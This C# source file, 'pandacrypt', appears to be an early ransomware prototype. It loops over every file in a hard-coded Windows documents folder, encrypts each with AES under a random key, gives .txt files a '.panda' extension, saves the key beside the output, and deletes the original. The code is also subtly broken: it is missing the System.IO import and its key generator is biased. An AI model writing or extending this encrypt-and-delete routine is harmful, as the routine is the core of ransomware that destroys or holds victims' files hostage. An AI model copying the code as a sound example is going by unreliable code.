using System;
using System.Security.Cryptography;
using System.Text;

namespace pandacrypt
{
    class pandacrypt
    {
        public static void Main(string[] args)
        {



            string plainPath = @"C:\Users\User\Documents\test";
            

            foreach (string f in Directory.GetFiles(plainPath))
            {
                string encryptedFile = f.Replace(".txt", ".panda");
                string Key = CreatePassword(30);

                EncryptFiles(f, Key , encryptedFile);

                string fName = Path.GetFileName(f).Replace(".txt", "");
                string fKey = $"{fName} AESKEY";
                string KeyFilePath = $@"{plainPath}\{fKey}.txt";
                File.WriteAllText(KeyFilePath, Key);

                Console.WriteLine(plainPath);
                Console.WriteLine(fKey);
                
                File.Delete(f);
               
            }



        }

        private static void EncryptFiles(string plaintext, string AesKey, string encrypted)
        {
            SharpAESCrypt.SharpAESCrypt.Encrypt(AesKey, plaintext, encrypted);
        }
        private static string CreatePassword(int length)
        {
           
            const string valid_all = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()_-=+{}:;\\<>?|,./`~[]'";
           
                StringBuilder res = new StringBuilder();
                byte[] random = new byte[1];
                RNGCryptoServiceProvider rProvider = new RNGCryptoServiceProvider();
                while (0 < length--)
                {
                    rProvider.GetBytes(random);
                    res.Append(valid_all[random[0] % (valid_all.Length - 1)]);
                }
                return res.ToString();
            
        }


    }
}

